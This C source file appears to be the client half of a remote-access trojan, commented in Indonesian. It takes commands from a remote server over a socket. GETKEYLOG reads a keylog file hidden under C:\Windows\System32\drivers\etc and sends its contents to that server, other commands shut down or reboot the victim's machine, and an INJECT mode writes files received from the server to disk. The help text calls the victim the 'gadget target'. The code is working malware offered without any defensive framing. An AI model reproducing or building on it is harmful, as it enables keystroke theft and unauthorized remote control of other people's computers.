#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "command.h"
#include "../common/common.h"


// OPERASI UNTUK ARRAY COMMAND 
void inisialisasi(box cmd){
	for(int i = 0; i < 10; i++){
		cmd[i].syntax = NULL;
		cmd[i].procedure = NULL;
	}
}

void proccess(char * syntax, void * param, box cmd){
	for(int i = 0; i < 10; i++){
		if(cmd[i].syntax == NULL) continue;
		if(strcmp(cmd[i].syntax, syntax) == 0){
			cmd[i].procedure(param);
			return;
		}
	}

	printf("%s IS NOT RECOGNISED", syntax);
}

void addCommand (char * syntax, void * procedure, box cmd){
	for(int i = 0; i < 10; i++){
		if(cmd[i].procedure == NULL){
			cmd[i].syntax = myStrdup(syntax);
			cmd[i].procedure = procedure;
			return;
		}
	}

	printf("STACK OVERFLOW\n");
}

// OPERASI UNTUK SINGULAR COMMAND

// COMMAND

void SHUTDOWN(void * param){
	system("shutdown /s /t 0");
}

void REBOOT(void * param){
	system("shutdown /r /t 0");
}

void EXIT(void * param){
	exit(0);
}

void HALLO(void * paramT){
	if(paramT == NULL) return;

	paramThread * param = (paramThread *)paramT;

	send((param)->clientSocket, "HALLO", 6, 0);
}

void HELP(void * paramT){
	if(paramT == NULL) return;

	paramThread * param = (paramThread *)paramT;

	char buffer[128] = {0};

	strcpy(buffer, "     ");
	send((param)->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(101);

	strcpy(buffer, "SHUTDOWN:\tShutdown gadget target");
	send((param)->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(101);

	strcpy(buffer, "REBOOT:\t\tReboot gadget target");
	send((param)->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(101);

	strcpy(buffer, "HALLO:\t\tCheck koneksi dengan gadget target mengirim pesan \"HALLO\"");
	send((param)->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(101);

	strcpy(buffer, "HELP:\t\tMemperlihatkan pesan ini");
	send((param)->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(101);

	strcpy(buffer, "GETKEYLOG:\tMendapatkan file keylog");
	send((param)->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(101);

	strcpy(buffer, "SURFMODE:\tAktivasi mode surf");
	send((param)->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(101);
}

void GETKEYLOG(void * paramT){
	if(paramT == NULL) return;

	paramThread * param = (paramThread *)paramT;

	char buffer[128] = {0};
	
	FILE * source_file = fopen("C:\\Windows\\System32\\drivers\\etc\\log", "r");
	//FILE * source_file = fopen("log.txt", "r");

	if (source_file == NULL){
		perror("");
		getchar();
		return;
	}

	strcpy(buffer, "GETKEYLOGFILE");
	send((param)->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(101);

	while (fgets(buffer, sizeof(buffer), source_file) != NULL) {
		send((param)->clientSocket, buffer, strlen(buffer), 0);
		memset(buffer, 0, strlen(buffer));
		Sleep(101);
	}

	strcpy(buffer, "ENDGETFILE");
	send((param)->clientSocket, buffer, strlen(buffer), 0);
	memset(buffer, 0, strlen(buffer));
	Sleep(101);


}

#ifdef _WIN32
DWORD WINAPI execMessage(LPVOID paramTh){
	if (paramTh == NULL) return -1;

	paramSurf * param = (paramSurf *)paramTh;
	char server_reply[1024] = {0};
	int recv_size = 0;

	box normalCommandPack;
	inisialisasi(normalCommandPack);

	addCommand("SHUTDOWN", (void *)SHUTDOWN, normalCommandPack);
	addCommand("REBOOT", (void *)REBOOT, normalCommandPack);
	addCommand("EXIT", (void *)EXIT, normalCommandPack);
	addCommand("HALLO", (void *)HALLO, normalCommandPack);
	addCommand("GETKEYLOG", (void *)GETKEYLOG, normalCommandPack);
	addCommand("HELP", (void *)HELP, normalCommandPack);

	unsigned char SURFMODE = 0;
	FILE * fp = NULL;
	while(1){
		while((param->paramT)->socketStatus == 'c' || (param->paramT)->socketStatus == 's'){
			recv_size = recv((param->paramT)->clientSocket, server_reply, sizeof(server_reply), 0);
			if (recv_size == 0 || recv_size == SOCKET_ERROR) {
				if((param->paramT)->socketStatus == 'c') (param->paramT)->socketStatus = 'x';
				else (param->paramT)->socketStatus = 'X';
				break;
			} else {
				if(strcmp(server_reply, "SURFMODE") == 0){
					SURFMODE = 1;
					memset(server_reply, '\0', sizeof(server_reply));
					continue;
				}else if(strcmp(server_reply, "END") == 0){
					SURFMODE = 0;
					memset(server_reply, '\0', sizeof(server_reply));
					continue;	
				}else if(strcmp(server_reply, "INJECT")==0){
					SURFMODE = 1;
					memset(server_reply, '\0', sizeof(server_reply));
					continue;	
				}else if(strcmp(server_reply, "ENDINJECT")==0){
					SURFMODE = 1; fclose(fp);
					memset(server_reply, '\0', sizeof(server_reply));
					continue;	
				}else if(strcmp(server_reply, "INJECT2")==0){
					SURFMODE = 2;
					memset(server_reply, '\0', sizeof(server_reply));
					continue;
				}

				if (SURFMODE == 0) proccess(server_reply, param->paramT, normalCommandPack);
				else if (SURFMODE == 1) strcpy((param)->input, server_reply);
				else if (SURFMODE == 2){	
					char buffer2[512] = {0};
					strcpy(buffer2, (param)->pwd);
					strcat(buffer2, "/");
					strcat(buffer2, server_reply);
					fp = fopen(buffer2, "w");

					SURFMODE = 3;
				}else if(SURFMODE == 3){
					fputs(server_reply, fp);
				}

				//printf("Server reply: %s\n", server_reply);
				memset(server_reply, '\0', sizeof(server_reply));
			}
		}
		Sleep(100);
	}

	return 0;
}
#else
#endif
